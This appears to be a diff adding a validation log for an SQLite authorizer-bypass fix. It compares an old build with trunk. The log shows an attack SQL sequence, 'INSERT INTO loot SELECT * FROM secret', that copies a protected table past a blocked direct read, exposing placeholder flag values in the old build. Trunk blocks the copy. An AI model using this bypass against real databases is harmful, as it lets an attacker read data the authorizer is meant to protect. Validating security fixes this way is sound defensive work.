@@ -1,0 +1,37 @@
+SQLite remote xfer authorizer exfil validation
+old-status: 3
+trunk-status: 0
+
+old log:
+victim_listening=127.0.0.1:40747
+ATTACK direct-secret-read SQL: SELECT label,value FROM secret
+VICTIM direct-secret-read REPLY:
+ERR rc=23 msg=access to secret.label is prohibited
+ATTACK xfer-copy SQL: INSERT INTO loot SELECT * FROM secret
+VICTIM xfer-copy REPLY:
+OK rc=0
+ATTACK loot-read SQL: SELECT label,value FROM loot
+VICTIM loot-read REPLY:
+OK rc=0
+ROW label=api_key value=FLAG{sqlite_xfer_authorizer_remote_exfil}
+ROW label=backup_key value=FLAG{sqlite_vacuum_authorizer_remote_exfil}
+DIRECT_SECRET_READ_BLOCKED=yes
+XFER_COPY_SUCCEEDED=yes
+SECRET_STOLEN=FLAG{sqlite_xfer_authorizer_remote_exfil}
+RESULT=VULNERABLE_REMOTE_EXFIL
+
+trunk log:
+victim_listening=127.0.0.1:44757
+ATTACK direct-secret-read SQL: SELECT label,value FROM secret
+VICTIM direct-secret-read REPLY:
+ERR rc=23 msg=access to secret.label is prohibited
+ATTACK xfer-copy SQL: INSERT INTO loot SELECT * FROM secret
+VICTIM xfer-copy REPLY:
+ERR rc=23 msg=access to secret.label is prohibited
+ATTACK loot-read SQL: SELECT label,value FROM loot
+VICTIM loot-read REPLY:
+OK rc=0
+DIRECT_SECRET_READ_BLOCKED=yes
+XFER_COPY_SUCCEEDED=no
+SECRET_STOLEN=no
+RESULT=SAFE_NO_EXFIL
